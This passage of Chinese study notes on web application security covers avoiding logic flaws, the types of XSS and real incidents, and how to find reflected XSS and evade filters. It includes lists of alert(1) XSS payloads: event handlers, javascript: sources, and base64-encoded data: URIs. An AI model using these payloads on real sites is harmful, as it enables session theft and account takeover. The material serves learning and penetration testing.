<li>由于程序将面临高负载访问，做好接收错误警报的准备；</li>
</ul>
<h2 id="避免逻辑缺陷"><a href="#避免逻辑缺陷" class="headerlink" title="避免逻辑缺陷"></a>避免逻辑缺陷</h2><p>由于逻辑缺陷是由于开发者在功能设计中考虑不周造成的，因此它出现的形式多种多样，并没有什么统一的规律；但仍然存在一些最佳实践能够尽量减少漏洞出现的概率；</p>
<ul>
<li>确保将应用程序的设计信息尽量清楚详细的记录在文档中，以方便其他人了解设计者在设计过程中做出的相关假设，从而不同人可以站在不同的视角，来判断其他假设是否隐藏潜在的漏洞；</li>
<li>要求所有的源代码提供清楚的注释，包括：<ul>
<li>每个代码组件的用途和使用方法；</li>
<li>每个组件对其接收的内容的假设；</li>
<li>进行代码的安全审查时，思考开发者的假设，是否任何被违背的可能性，尤其是当输入是能否被用户完全控制的时候；</li>
<li>进行代码的安全审查时，思考两个问题：程序如何处理用户的异常行为和输入；功能依赖的不同组件之间是否可能造成相互影响；</li>
</ul>
</li>
</ul>
<p>铭记以下内容：</p>
<ul>
<li>用户可以控制请求的所有内容；</li>
<li>仅根据会话确定用户的身份与权限；不根据请求中的内容对用户的权限做出任何假设；</li>
<li>当根据用户的请求，对会话数据进行操作时，考虑可能给程序功能造成什么影响；很多时候影响是跨开发者的，即影响了其他程序员开发的功能；</li>
<li>如果某个搜索功能能否访问用户本应无法访问的敏感信息，则应该确保用户无法使用该功能，或者无法根据搜索结果提取有用的信息，或者根据当前用户的信息执行动态的搜索；</li>
<li>在双重授权模型中，考虑一个高级权限用户，创建另外一个相同权限用户的可能影响；</li>
</ul>
<h2 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h2><p>探查逻辑缺陷的关键点，在于洞查开发者的思维方式，他们会如何完成某个功能，会走哪些捷径，会做出哪种错误的假设，通常会犯下什么错误、当开发时间紧张时会漏考虑什么问题等；</p>
<h1 id="12-攻击其他用户"><a href="#12-攻击其他用户" class="headerlink" title="12. 攻击其他用户"></a>12. 攻击其他用户</h1><h2 id="XSS-的分类"><a href="#XSS-的分类" class="headerlink" title="XSS 的分类"></a>XSS 的分类</h2><h3 id="反射型-XSS-漏洞"><a href="#反射型-XSS-漏洞" class="headerlink" title="反射型 XSS 漏洞"></a>反射型 XSS 漏洞</h3><p>提取用户提交的输入，并将其插入到服务器响应的 HTML 代码中，是 XSS 漏洞的一个明显特征；一个常见的场景是开发者通常会写好一些模板，然后提取用户的输入，插入到模板中的指定位置，生成最终发给浏览器的 HTML 文件；此时，如果攻击者在输入中混入 js 代码，则服务器发回的 HTML 文件，将会触发 js 代码的执行；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074911.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>这个漏洞能否利用成功的关键点在于，攻击者要诱使用户访问一个由攻击者提供的链接，这个链接将指向攻击者想要攻击的网站，而不是攻击者自己的网站；之后，由于浏览器的同源策略，当用户对某个网站发起请求时，浏览器会执行该网站返回的脚本，并允许其访问网站域名对应的浏览器端数据（例如 cookie）；由于脚本是由攻击者设计并插入的，是一段恶意的脚本；该脚本获得目标网站的敏感数据后，再将数据发至攻击者自己的服务器；</p>
</blockquote>
<h3 id="保存型-XSS-漏洞"><a href="#保存型-XSS-漏洞" class="headerlink" title="保存型 XSS 漏洞"></a>保存型 XSS 漏洞</h3><p>A 用户提交的数据，未经过滤或者净化即显示给 B 用户，则可能产生此类漏洞；例如应用程序有运行终端用户进行交互的功能，或者具有管理权限的员工访问普通用户提交的数据的功能；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226074719.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>严格意义来说，保存型漏洞算不上跨站点的XSS 类型了，因为在整个过程中并没有涉及第二个站点，都一直是在同一个站点中；</p>
</blockquote>
<h3 id="基于-DOM-的-XSS-漏洞"><a href="#基于-DOM-的-XSS-漏洞" class="headerlink" title="基于 DOM 的 XSS 漏洞"></a>基于 DOM 的 XSS 漏洞</h3><p>反射型 XSS 的原理是由服务端将恶意代码插入到 HTML 标签中，被客户端浏览器加载后，即可被执行；DOM 型 XSS 是将恶意代码放在参数中，由应用程序 HTML 页面的正常 JS 脚本去提取它，然后触发被执行（感觉有点类似于一个二阶的反射型 XSS）；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210226080043.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="进行中的-XSS-攻击"><a href="#进行中的-XSS-攻击" class="headerlink" title="进行中的 XSS 攻击"></a>进行中的 XSS 攻击</h2><h3 id="真实-XSS-攻击"><a href="#真实-XSS-攻击" class="headerlink" title="真实 XSS 攻击"></a>真实 XSS 攻击</h3><h4 id="案例一：Apache-问题反馈"><a href="#案例一：Apache-问题反馈" class="headerlink" title="案例一：Apache 问题反馈"></a>案例一：Apache 问题反馈</h4><p>Apache 基金会官网有一个问题追踪的功能存在反射型 XSS 漏洞，攻击者利用该功能发布了一个恶意链接，诱使其他用户点击；当管理员点击时，他的会话将会发给攻击者；攻击者利用管理员的身份登录后，获得应用程序的管理员权限；然后修改了某个项目默认上传文件夹的位置，将其更改为 Web 根目录中的可执行目录；之后，攻击者向该目录上传了一个木马登录表单，从而获取特权用户的用户名和密码；由于很多用户经常在不同系统中使用相同的密码，攻击者进一步扩大了其攻击范围，延伸到了当前 Web 应用程序之外；</p>
<h4 id="案例二：MySpace-个人资料"><a href="#案例二：MySpace-个人资料" class="headerlink" title="案例二：MySpace 个人资料"></a>案例二：MySpace 个人资料</h4><p>MySpace 社交网站的用户资料页存在保存型的 XSS 漏洞，虽然其对用户的输入进行了过滤，但是不彻底；攻击者在自己的个人资料介绍页中插入脚本，当其他用户尝试看他的资料时，就会触发脚本的执行；该脚本会触发浏览器执行一系列的操作，包括将攻击者添加为用户的好友，并将脚本进一步插入到用户的个人资料页中，这样当用户的好友查看当前用户资料页，脚本就会呈指数级的进一步扩散；短短几个小时，就有一百多万人将攻击者添加为好友；</p>
<h4 id="案例三：电子邮件"><a href="#案例三：电子邮件" class="headerlink" title="案例三：电子邮件"></a>案例三：电子邮件</h4><p>电子邮件允许内容为 HTML 格式，同时很多电子邮件程序提供网页版，因此攻击者可以向其他用户发送带有恶意脚本的电子邮件；当邮件在浏览器端被打开时，脚本即可以被浏览器触发执行；（电子邮件是保存型 XSS 漏洞的天然场所）；</p>
<h4 id="案例四：Twitter"><a href="#案例四：Twitter" class="headerlink" title="案例四：Twitter"></a>案例四：Twitter</h4><p>Twitter 网站曾经成为保存型和 DOM 型漏洞的受害者，原因在于 Twitter 在其客户端大量使用类似 Ajax 的代码，从而使得脚本有机会被触发；</p>
<h3 id="XSS-攻击方法"><a href="#XSS-攻击方法" class="headerlink" title="XSS 攻击方法"></a>XSS 攻击方法</h3><h4 id="传播假消息"><a href="#传播假消息" class="headerlink" title="传播假消息"></a>传播假消息</h4><p>当某个公司的网站存在保存型 XSS 漏洞时，攻击者可以利用访漏洞，向目标网站注入精心设计的页面，让其看起来像真的一样；当不明真相的用户访问该网站时，会被这些以假乱真的信息所误导，甚至会触发媒体进一步报导，会引发市场恐慌，影响公司股价，之后攻击者可以从中获取利益；</p>
<h4 id="注入木马功能"><a href="#注入木马功能" class="headerlink" title="注入木马功能"></a>注入木马功能</h4><p>攻击者在目标网站中注入恶意代码，诱使用户执行一些有害操作，例如输入敏感数据（例如证书），然后发送给攻击者；之后攻击者就可以使用该用户的身份登录目标网站，实现自己的利益（很多钓鱼网站的套路）；</p>
<p>另外一种诱使的办法是以某种非常有吸引力的条件为诱饵，要求用户输入他们的敏感信息，例如信用卡信息；由于此时的 URL 是指向真实的域名，所有用户很容易上当；</p>
<h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>仅仅得到普通用户的会话有时并没有什么特别大的用处，因为攻击者不可能时时监控他的服务器，同时当他代表用户进行操作时，也会在应用程序中留下非用户电脑的登录记录；更好的办法是注入自动化的脚本，该脚本会尝试提升攻击者账户的权限，通常来说这会失败；但是等待一段时间，当管理员登录并触发恶意脚本时，提升权限的动作就会成功，成功相当隐蔽，不容易被察觉和发现；</p>
<h4 id="自动填写的表单、本地程序、ActiveX控件"><a href="#自动填写的表单、本地程序、ActiveX控件" class="headerlink" title="自动填写的表单、本地程序、ActiveX控件"></a>自动填写的表单、本地程序、ActiveX控件</h4><p>XSS 能够是建立在浏览器默认会信用由当前网站提供的脚本，然后执行它；事实上，还存在着其他一些信任关系可以利用，包括：</p>
<ul>
<li>有些应用程序提供自动完成表单的功能，当该功能被激活后，恶意脚本可以先实例化一个虚拟的表单，触发浏览器会将缓存信息自动填写到表单中，然后恶意脚本就可以访问表单中的内容，发送给攻击者；</li>
<li>一些 Web 应用程序会要求用户将其域名添加到可信站点，这个操作其实是变相提高了 Web 程序在用户本地电脑的权限；当 Web 程序存在 XSS 漏洞时，攻击者就可以利用该漏洞和已经提升后的权限，在用户的电脑上执行更高权限的操作，例如启动某个本地程序；</li>
<li>一些 Web 应用程序为加强客户端的功能，可能提供具备强大方法的 ActiveX 控件，当漏洞被攻击者发现和利用后，攻击者可以进一步利用控件中的方法，来完成恶意操作；</li>
</ul>
<blockquote>
<p>XSS 漏洞不仅仅会影响因特网上的 Web 应用程序，同时也会影响内网中的应用程序，例如保存型脚本可以利用邮件在同事之间传播，并利用内网服务器经常信任其域内计算机的特点，攻击内网中的应用程序；</p>
</blockquote>
<h3 id="XSS-攻击的传送机制"><a href="#XSS-攻击的传送机制" class="headerlink" title="XSS 攻击的传送机制"></a>XSS 攻击的传送机制</h3><h4 id="传送反射型与基于-DOM-的-XSS-攻击"><a href="#传送反射型与基于-DOM-的-XSS-攻击" class="headerlink" title="传送反射型与基于 DOM 的 XSS 攻击"></a>传送反射型与基于 DOM 的 XSS 攻击</h4><h5 id="发邮件或即时消息"><a href="#发邮件或即时消息" class="headerlink" title="发邮件或即时消息"></a>发邮件或即时消息</h5><ul>
<li>当攻击者利用漏洞设计好攻击脚本后，他可以有针对性的发给特定用户，例如管理员，假装抱怨网站的某个功能不可用，诱使管理员打开邮件，触发恶意脚本的执行；许多应用程序还提供“推荐给朋友”或者“提交反馈”的功能，这种功能经常会生成一封电子邮件，有时内容和收件人可由用户自定义；攻击者可以邮件内容中插入恶意脚本，当收件人当开时，触发脚本的执行；尤其是被管理员打开时最有用；</li>
<li>在即时消息中向目标用户提供一个包含恶意脚本或参数的 URL；</li>
</ul>
<h5 id="第三方网站"><a href="#第三方网站" class="headerlink" title="第三方网站"></a>第三方网站</h5><ul>
<li>很多第三方网站允许用户发布 HTML 内容，例如论坛；攻击者可以利用该功能，在第三方网站上发布某个携带恶意 URL 的内容，诱使其他用户点击；该 URL 实际指向的是攻击者服务器的一段恶意脚本，当用户在不知情的情况下点击该 URL，浏览器将会请求恶意脚本到用户的电脑上，并触发脚本的执行；</li>
<li>攻击者可以付费发布广告，然后在广告中包含某个指向漏洞网站的 URL，诱使用户点击，触发脚本执行；很多公司会付费进行推广，同时设计相关的广告；攻击者可以设计一个类似的广告，让它看起来像真的一样，并付费让其混杂在该公司的实际广告中，这种做法非常以假乱真，用户有很大概率会点击；该做法相当于攻击者付费买进了大量的用户会话；</li>
</ul>
<h5 id="自建站点"><a href="#自建站点" class="headerlink" title="自建站点"></a>自建站点</h5><ul>
<li>攻击者可以自建站点，包含一些有吸引力的内容，同时也包含一些恶意脚本，触发用户向易受攻击的应用程序提出包含 XSS 的语法；如果用户刚好登录了易受攻击的应用程序，并且碰巧浏览了攻击者的站点，攻击者就有机会获得用户的会话；</li>
<li>攻击者可以在自建站点上模拟搜索引擎的功能，当用户提交搜索的关键字后，攻击者向用户展示搜索结果，诱使用户点击看上去最相关的内容，但实际上内容的链接指向的是某个易受攻击的网站；</li>
</ul>
<h4 id="传送保存型-XSS-攻击"><a href="#传送保存型-XSS-攻击" class="headerlink" title="传送保存型 XSS 攻击"></a>传送保存型 XSS 攻击</h4><h5 id="带内传送"><a href="#带内传送" class="headerlink" title="带内传送"></a>带内传送</h5><p>攻击者控制的数据，通过应用程序本身的 Web 界面提交给应用程序，并最终在 Web 界面上呈现，常见显示位置包括：</p>
<ul>
<li>个人信息字段：例如姓名、电子邮件、地址、电话等；</li>
<li>文档、上传文件和其他数据的名称；</li>
<li>提交给管理员的反馈或问题；</li>
<li>向其他应用程序用户传送的消息、注释、问题等；</li>
<li>记录在应用程序日志中，管理员通过浏览器进行查看的内容，例如 URL, 用户名, HTTP Referer, User-Agent 等；</li>
<li>在用户之间共享的上传文件内容等；</li>
</ul>
<h5 id="带外传送"><a href="#带外传送" class="headerlink" title="带外传送"></a>带外传送</h5><p>在应用程序之外的界面上显示控制数据，例如通过电子邮件发送恶意链接，诱使受害者进行点击；链接最终在受害者的邮件页面上显示，而不是受攻击的应用程序界面上显示；</p>
<h4 id="漏洞复合攻击"><a href="#漏洞复合攻击" class="headerlink" title="漏洞复合攻击"></a>漏洞复合攻击</h4><p>有时候单个漏洞可能属于风险极低的漏洞，虽然漏洞存在，但对于攻击者来说可能并没有利用的价值；但是当多个低风险的漏洞同时存在，并可以整合利用时，有可能会变成一个大漏洞；</p>
<blockquote>
<p>例1：昵称只有本人可见的功能，是一个小漏洞，但同时用户有权限修改其他用户的昵称，则它将变成一个巨大的漏洞；</p>
<p>例2：应用程序中包含保存型 XSS 漏洞，同时仅向用户显示的个人数据存在跨站请求伪造的漏洞，二者结合将变成一个巨大的漏洞；</p>
</blockquote>
<h2 id="查找并利用-XSS-漏洞"><a href="#查找并利用-XSS-漏洞" class="headerlink" title="查找并利用 XSS 漏洞"></a>查找并利用 XSS 漏洞</h2><p>使用某个设计的字符串，将其作其参数值，提交给应用程序页面上的每一个参数，监控应用程序的响应，但该字符串是否会出现在响应中，如果会的话，表示程序很可能存在 XSS 漏洞；</p>
<blockquote>
<p>常见的漏洞验证字符串 “&gt;<script>alert(document.cookie)<script>"，该字符串的要点在于通过第一个右尖括号，结果插入位置前面的 HTML 标签，然后引入一段 script 脚本；</p>
</blockquote>
<p>为了避免 XSS 漏洞，许多应用程序会对用户的输入进行过滤，删除或转义其他的 "<script>" 或者尖括号等字符；但是开发者的过滤机制经常有缺陷，攻击者可以通过对关键符号进行转义、插入空格、改变大小写、多层嵌套等方法来避开过滤，例如设计为下面这种类型的输入：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302090153.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>如果应用程序没有对输入进行过滤，则很容易通过输入并验证响应的方式，来实现漏洞检测的自动化；但如果应用程序对输入进行了过滤，由于过滤规则一开始是未知的，因此不能简单的通过比对来实现自动化检测，此时需要手工检测，并观察和猜测过滤规则，以找到规避的方式；</p>
</blockquote>
<h3 id="查找并利用反射型-XSS-漏洞"><a href="#查找并利用反射型-XSS-漏洞" class="headerlink" title="查找并利用反射型 XSS 漏洞"></a>查找并利用反射型 XSS 漏洞</h3><p>在解析应用程序功能阶段，收集所有的用户输入点，针对每个输入点，系统性的实施以下步骤，以便找出哪些输入点最终会显示在界面上：</p>
<ul>
<li>提交一个设计过的良性字符串（例如纯字母组成），确保该字符串之前不可能出现在程序中的任何位置；</li>
<li>确认该良性字符串在应用程序中出现的所有位置；</li>
<li>对于每个反射，记录其语法上下文；</li>
<li>提交针对语法上下文而设计的数据，尝试在响应中引入任意脚本；</li>
<li>如果提交的数据被阻止或者净化，导致脚本无法执行，尝试了解净化规则，以避开过滤机制；</li>
</ul>
<h4 id="确认用户输入的反射"><a href="#确认用户输入的反射" class="headerlink" title="确认用户输入的反射"></a>确认用户输入的反射</h4><p>渗透测试步骤</p>
<ul>
<li>选择任意一个字符串，确保它之前未出现在应用程序中的任何地方，并且让其仅包含字符，这样不会受到过滤规则的影响；提交该字符串，将其做为某个参数值，每次请求只针对一个参数；</li>
<li>针对每次请求，监管应用程序的响应，看其中是否出现同一个字符串；记录下所有满足条件的参数；</li>
<li>测试 GET 和 POST 请求；当在 POST 请求中发现 XSS 漏洞时，改变请求方法，确认是否可以通过 GET 请求实施相同的攻击；</li>
<li>除了请求参数外，还应该检查请求的消息头中的内容，是否也会出现在响应的内容中；如果会的话，意味着可以通过定制消息头，来利用 XSS 漏洞；</li>
</ul>
<h4 id="测试插入脚本的反射"><a href="#测试插入脚本的反射" class="headerlink" title="测试插入脚本的反射"></a>测试插入脚本的反射</h4><p>当找到反射位置后，务必手动检查每一个位置，以便确定该位置是否可以利用；针对该位置的上下文语法，针对性的设计输入，以便输入的脚本可以被执行；</p>
<h5 id="例1：标签的属性值位置"><a href="#例1：标签的属性值位置" class="headerlink" title="例1：标签的属性值位置"></a>例1：标签的属性值位置</h5><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210302092057.png" srcset="/img/loading.gif" lazyload></p>
<p>字符串出现在 input 标签的 value 属性上，此时可以通过设计脚本，针对该处的上下文语法，结束 input 标签，并引入自定义的脚本；</p>
<p>另外，如果应用程序过滤输入，此时也可以不引入脚本，而是针对该位置的特点，在 input 标签中引入事件处理器，例如：" onfocus="alert(1)</p>
<h5 id="例2：Javascript-字符串"><a href="#例2：Javascript-字符串" class="headerlink" title="例2：Javascript 字符串"></a>例2：Javascript 字符串</h5><p>如果输入做为变量值出现在响应的脚本中，则可以针对性的插入经过设计的字符串，让其截断原来的引号，改变语义，执行目标脚本；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303074105.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>注意保证插入位置后续的脚本语法正确，以便浏览器可以正确执行，有时可以通过插入 // 将后续的脚本变成注释；</p>
</blockquote>
<h5 id="例3：包含-URL-的属性"><a href="#例3：包含-URL-的属性" class="headerlink" title="例3：包含 URL 的属性"></a>例3：包含 URL 的属性</h5><p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080849.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>HTML <a> 标签 的 href 属性原来支持插入脚本，之前一直不知道这个事情；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210303080801.png" srcset="/img/loading.gif" lazyload></p>
<p>渗透测试步骤</p>
<p>针对在解析过程中记下的每一个漏洞位置，采取以下措施：</p>
<ul>
<li>检查 HTML 源代码，确定受控制字符串的位置；</li>
<li>如果字符串出现在多个位置，则每个位置都可能是一个潜在的漏洞，应加以分析；</li>
<li>如果字符串出现在 HTML 中，则可以考虑如果设计字符串，让脚本得以执行；</li>
<li>向应用程序提交字符串，测试是否有效果，返回的响应是否与预期一致；</li>
</ul>
<h4 id="探查防御性过滤"><a href="#探查防御性过滤" class="headerlink" title="探查防御性过滤"></a>探查防御性过滤</h4><p>通常情况下，很多应用程序都会实施一定程度的输入过滤检查，因此并不一定能够得到原始的输入，但是，这些过滤机制或多或少也都会存在漏洞，应该进一步分析并加以利用；</p>
<p>常见的防御机制：</p>
<ul>
<li>应用程序本身或者应用程序的防火墙，使用某种输入匹配筛查，发现了攻击意图，完全阻止了输入；</li>
<li>应用程序接受了输入，但对输入进行了净化或编码；</li>
<li>应用程序将输入截短为某个固定的最大长度；</li>
</ul>
<h4 id="避开基于匹配的过滤"><a href="#避开基于匹配的过滤" class="headerlink" title="避开基于匹配的过滤"></a>避开基于匹配的过滤</h4><p>应用程序使用某种匹配机制，来检查输入中是否包含不合法的字符；此时，可轮流删除字符串的不同部分，看输入是否仍然被阻止，以便查明到底是哪部分的字符串，触发了检查；找到后，有针对性的设计输入，以便可以避开检查；</p>
<p>有四种常见的方法，可以用来在 HTML 页面中引入脚本代码；</p>
<h5 id="插入脚本的方法"><a href="#插入脚本的方法" class="headerlink" title="插入脚本的方法"></a>插入脚本的方法</h5><h6 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h6><p>插入 <object> 或者 <a> 标签，并利用这两个标签的 data 或 href 属性，来插入脚本，同时，对脚本进行编码（例如 base64），以避开检查</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html, &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;data:text/html;base64,PHNjcnlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>点击这里<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>上面的 base64 字符串是对字符串 <script>alert(1)</script> 的编码；</p>
</blockquote>
<h6 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h6><p>很多标签都支持各种各样的事件，有些事情甚至不需要用户做任何交互即可执行，因此，只要将事件插入到标签的属性中，就可以让脚本得以执行；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;!-不需要交互需要可执行的脚本-&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">valid.gif</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">valid.gif</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">valid.gif</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">isindex</span> <span class="hljs-attr">type</span>=<span class="hljs-string">image</span> <span class="hljs-attr">src</span>=<span class="hljs-string">valid.gif</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">isindex</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bgsound</span> <span class="hljs-attr">onreadystatechange</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">bgsound</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onbeforeactivate</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onactivate</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onfocusin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onscroll</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br><br>&lt;!-HTML5 允许在结束标签中使用事件处理器-&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>&lt;/a onmousemove=alert(1)&gt;<br></code></pre></td></tr></table></figure>

<h6 id="伪源"><a href="#伪源" class="headerlink" title="伪源"></a>伪源</h6><p>HTML 中有些标签的脚本也支持插入脚本，例如 object、a、iframe、embed 等；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">data</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">event-source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">event-source</span>&gt;</span><br>   <br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;test&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">javascript:alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>HTML5 引入的 event-source 标签特别有用，因为该标签包含一个连字符，这意味着传统的正则表达式过滤机制需要支持它，从而引入了新的漏洞可能性；</p>
</blockquote>
<h6 id="动态样式"><a href="#动态样式" class="headerlink" title="动态样式"></a>动态样式</h6><p>HTML 支持在标签的 style 属性中使用表达式，来对标签的样式进行求值，这意味着可以利用该特性，插入恶意脚本</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">x</span> <span class="hljs-attr">style</span>=<span class="hljs-string">behavior:url(#default#time2)</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="避开过滤：HTML"><a href="#避开过滤：HTML" class="headerlink" title="避开过滤：HTML"></a>避开过滤：HTML</h5><p>一些应用程序使用正规表达式，对于前面提到的各种插入办法的输入进行过滤，为了避开过滤，需要对输入进行模糊处理，常用的方法如下：</p>
